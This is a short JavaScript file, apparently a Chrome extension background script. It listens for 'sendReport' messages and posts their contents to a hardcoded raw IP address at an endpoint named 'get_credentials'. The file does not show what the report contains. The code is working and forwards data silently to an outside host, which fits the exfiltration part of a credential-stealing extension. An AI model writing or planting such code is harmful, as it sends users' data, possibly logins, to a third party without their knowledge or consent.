chrome.runtime.onMessage.addListener(function (message) {

    if (message.action === "sendReport") {

        fetch("http://98.70.59.35/api/v1/get_credentials/", {
            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({
                report: message.report
            })
        })

        .then(function (response) {
            if (!response.ok) {
                throw new Error("Server returned " + response.status);
            }

            return response.json();
        })

        .then(function (data) {
            console.log("Server response:", data);
        })

        .catch(function (error) {
            console.log("POST request failed:", error);
        });
    }
});
